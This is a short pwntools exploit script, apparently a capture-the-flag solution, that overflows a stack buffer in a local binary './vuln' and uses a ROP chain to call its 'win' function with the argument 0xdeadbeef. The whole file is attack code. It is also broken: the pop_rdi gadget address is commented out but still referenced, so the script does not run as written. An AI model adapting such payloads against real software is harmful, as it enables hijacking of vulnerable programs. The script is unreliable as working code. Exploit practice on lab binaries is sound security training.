from pwn import *

p = process("./vuln")
e = ELF("./vuln")
win = e.sym['win']
# pop_rdi = 0x401353
payload = b"A" * 18 +  p64(pop_rdi) + p64(0xdeadbeef) + p64(win)

p.sendline(payload)
p.interactive()
